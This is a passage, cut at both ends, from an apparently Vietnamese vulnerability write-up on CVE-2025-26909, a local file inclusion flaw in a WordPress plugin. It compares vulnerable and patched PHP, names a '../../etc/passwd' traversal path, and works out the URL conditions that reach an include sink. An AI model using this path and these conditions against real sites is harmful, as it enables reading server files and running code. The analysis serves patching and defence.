</span></span><span class="line"><span class="cl">    <span class="c1">// Return the constructed URL
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nv">$new_url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Hàm <code>getOriginalUrl()</code> dùng để phân tích và tái tạo lại URL gốc dựa trên các quy tắc rewrite trong hệ thống.</p>
<p>Trong phiên bản lỗi, giá trị <code>$new_url</code> không được làm sạch trước khi trả về, cho phép kẻ tấn công chèn đường dẫn độc hại như <code>../../etc/passwd</code> dẫn đến nguy cơ <strong>LFI</strong>.</p>
<p><strong>Bản vá</strong>:</p>
<div class="highlight" filename="Files.php v5.4.02"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="hl"><span class="lnt">49
</span></span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getOriginalUrl</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Build the rewrite rules if they are not already built
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildRedirect</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Parse the URL components
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$parse_url</span> <span class="o">=</span> <span class="nx">wp_parse_url</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Only if there is a path to change
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Get the home root path
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$path</span> <span class="o">=</span> <span class="nx">wp_parse_url</span><span class="p">(</span> <span class="nx">home_url</span><span class="p">(),</span> <span class="nx">PHP_URL_PATH</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Backslash the paths
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nv">$path</span> <span class="o">&lt;&gt;</span> <span class="s1">&#39;&#39;</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span> <span class="s1">&#39;/^&#39;</span> <span class="o">.</span> <span class="nx">preg_quote</span><span class="p">(</span> <span class="nv">$path</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Replace paths to original based on rewrite rules
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">],</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">],</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">],</span> <span class="mi">1</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Default to https if the scheme is not set
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;https&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Reconstruct the URL
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">]</span> <span class="o">&lt;&gt;</span> <span class="mi">80</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$new_url</span> <span class="o">=</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;://&#39;</span> <span class="o">.</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$path</span> <span class="o">.</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$new_url</span> <span class="o">=</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;://&#39;</span> <span class="o">.</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$path</span> <span class="o">.</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Append query string if present
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$query</span>   <span class="o">=</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$query</span>   <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;%3F&#39;</span> <span class="p">),</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="nv">$query</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$new_url</span> <span class="o">.=</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$new_url</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span> <span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;?&#39;</span> <span class="o">:</span> <span class="s1">&#39;&amp;&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="nv">$query</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Return the constructed URL
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nx">sanitize_url</span><span class="p">(</span> <span class="nv">$new_url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Bản vá gọi <code>sanitize_url($new_url)</code> trước khi trả về, giúp loại bỏ đường dẫn hoặc scheme nguy hiểm, từ đó ngăn chặn khả năng <strong>LFI</strong>.</p>
<h3 class="heading-element" id="vulnerable-code"><span>Vulnerable Code</span>
  <a href="#vulnerable-code" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><code>getOriginalUrl()</code> được gọi trong hàm <code>showFile()</code>, gán giá trị trả về cho <code>$new_url</code></p>
<div class="highlight" filename="Files.php v5.3.02"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="hl"><span class="lnt"> 1
</span></span><span class="lnt"> 2
</span><span class="hl"><span class="lnt"> 3
</span></span><span class="lnt"> 4
</span><span class="hl"><span class="lnt"> 5
</span></span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="hl"><span class="lnt">12
</span></span><span class="lnt">13
</span><span class="lnt">14
</span><span class="hl"><span class="lnt">15
</span></span><span class="lnt">16
</span><span class="hl"><span class="lnt">17
</span></span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line hl"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">showFile</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// other logic
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$new_url</span>          <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getOriginalUrl</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$new_url_no_query</span> <span class="o">=</span> <span class="p">(</span> <span class="p">(</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$new_url</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">substr</span><span class="p">(</span> <span class="nv">$new_url</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$new_url</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="o">:</span> <span class="nv">$new_url</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$new_path</span>         <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getOriginalPath</span><span class="p">(</span> <span class="nv">$new_url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ctype</span>            <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isFile</span><span class="p">(</span> <span class="nv">$new_url</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// other logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nv">$new_url_no_query</span> <span class="p">),</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">HMWP_Classes_Tools</span><span class="o">::</span><span class="na">getOption</span><span class="p">(</span> <span class="s1">&#39;hmwp_login_url&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nv">$new_url_no_query</span> <span class="p">),</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">HMWP_Classes_Tools</span><span class="o">::</span><span class="na">getDefault</span><span class="p">(</span> <span class="s1">&#39;hmwp_login_url&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// other logic
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="nv">$url</span> <span class="o">&lt;&gt;</span> <span class="nv">$new_url</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">stripos</span><span class="p">(</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nv">$new_url_no_query</span> <span class="p">),</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">HMWP_Classes_Tools</span><span class="o">::</span><span class="na">getDefault</span><span class="p">(</span> <span class="s1">&#39;hmwp_wp-json&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// other logic
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nv">$new_url_no_query</span> <span class="p">),</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">HMWP_Classes_Tools</span><span class="o">::</span><span class="na">getDefault</span><span class="p">(</span> <span class="s1">&#39;hmwp_activate_url&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nv">$new_url_no_query</span> <span class="p">),</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">HMWP_Classes_Tools</span><span class="o">::</span><span class="na">getDefault</span><span class="p">(</span> <span class="s1">&#39;hmwp_wp-signup_url&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">ob_start</span><span class="p">();</span>
</span></span><span class="line hl"><span class="cl">            <span class="k">include</span> <span class="nv">$new_path</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$content</span> <span class="o">=</span> <span class="nx">ob_get_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span> <span class="s2">&#34;HTTP/1.1 200 OK&#34;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//Echo the html file content
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">echo</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">HMWP_Classes_Tools</span><span class="o">::</span><span class="na">getValue</span><span class="p">(</span> <span class="s1">&#39;nordt&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// other logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>include $new_path</code> là điểm có thể gây LFI; để thực thi được, các điều kiện bao quanh phải được thỏa mãn.</p>
<ol>
<li><code>$url</code> khác <code>$new_url</code></li>
</ol>
<p>Trong <code>getOriginalUrl()</code> đoạn xử lý query:</p>
<div class="highlight" filename="Files.php v5.3.02"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="hl"><span class="lnt">4
</span></span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$query</span>   <span class="o">=</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$query</span>   <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;%3F&#39;</span> <span class="p">),</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="nv">$query</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$new_url</span> <span class="o">.=</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$new_url</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span> <span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;?&#39;</span> <span class="o">:</span> <span class="s1">&#39;&amp;&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="nv">$query</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>wp_parse_url( 'http://localhost/x/abc?' )</code> -&gt; có <code>path</code> nhưng <code>query</code> rỗng (hoặc <code>query</code> không được set / empty).</li>
<li>Điều kiện <code>isset(...) &amp;&amp; ! empty(...)</code> sẽ <strong>fail</strong> với <code>?</code> không có param, nên không append gì vào <code>$new_url</code>.</li>
<li><code>$new_url</code> trả về <code>http://localhost/x/abc</code> (không có <code>?</code>), trong khi <code>$url</code> ban đầu là <code>http://localhost/x/abc?</code> do đó khác nhau và (<code>$url &lt;&gt; $new_url</code>) là <code>true</code>.</li>
</ul>
<ol start="2">
<li>Biến <code>$new_url_no_query</code> phải chứa chuỗi <code>'/' . HMWP_Classes_Tools::getDefault('hmwp_activate_url') . '/'</code>.</li>
</ol>
<p>Khi tìm trong mã nguồn plugin với từ khóa <code>hmwp_activate_url</code>, ta thấy hàm <code>HMWP_Classes_Tools::getDefault('hmwp_activate_url')</code> trả về giá trị <strong><code>wp-activate.php</code></strong>.</p>
<figure><img src="/posts/2025-10-18-cve-2025-26909/search1.png"
    alt="Kết quả trả về của HMWP_Classes_Tools::getDefault( &#39;hmwp_activate_url&#39; )"><figcaption>
      <p>Kết quả trả về của <code>HMWP_Classes_Tools::getDefault( 'hmwp_activate_url' )</code></p>
    </figcaption>
</figure>

<p>Do đó, điều kiện thực tế là <code>$new_url_no_query</code> phải chứa <strong><code>/wp-activate.php/</code></strong>.</p>
<p>👉 Như vậy, để đoạn <code>include $new_path</code> được thực thi, URL phải có <strong>ký tự <code>?</code> ở cuối</strong> (để <code>$url &lt;&gt; $new_url</code>) và <strong>chứa <code>/wp-activate.php/</code></strong> trong đường dẫn.</p>
<p><code>$new_path</code> là giá trị trả về của <code>getOriginalPath($new_url)</code></p>
<div class="highlight" filename="Files.php v5.3.02"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="hl"><span class="lnt"> 3
</span></span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="hl"><span class="lnt"> 7
</span></span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="hl"><span class="lnt">10
</span></span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getOriginalPath</span><span class="p">(</span> <span class="nv">$new_url</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Remove domain from path
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$new_path</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">home_url</span><span class="p">(),</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$new_url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Remove queries from path
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$new_path</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$new_path</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span> <span class="nv">$new_path</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$new_path</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line hl"><span class="cl">    <span class="k">return</span> <span class="nx">HMWP_Classes_Tools</span><span class="o">::</span><span class="na">getRootPath</span><span class="p">()</span> <span class="o">.</span> <span class="nx">ltrim</span><span class="p">(</span> <span class="nv">$new_path</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Hàm này trả về path gốc không chứa params string, ví dụ:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="s2">&#34;http://localhost/x/wp-activate.php?&#34;</span> <span class="o">-&gt;</span> <span class="s2">&#34;/srv/www/wordpress/x/wp-activate.php&#34;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Như vậy ta đã có các điều kiện cần thiết để LFI xảy ra, ta cần tìm luồng gọi đến <code>showFile()</code></p>
<div class="highlight" filename="Files.php v5.3.02"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="hl"><span class="lnt"> 3
</span></span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="hl"><span class="lnt"> 7
</span></span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="hl"><span class="lnt">10
</span></span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">maybeShowNotFound</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//If the file doesn&#39;t exist
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="c1">//show the file content
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_404</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">showFile</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getCurrentURL</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
